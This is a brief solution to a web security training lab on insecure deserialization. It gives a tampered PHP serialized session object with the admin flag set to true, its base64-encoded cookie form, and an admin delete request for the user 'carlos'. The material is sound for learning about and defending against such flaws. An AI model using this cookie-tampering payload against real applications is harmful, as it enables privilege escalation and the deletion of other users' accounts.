```
Lab: Modifying serialized objects

APPRENTICE

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
> Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30

/admin/delete?username=carlos

---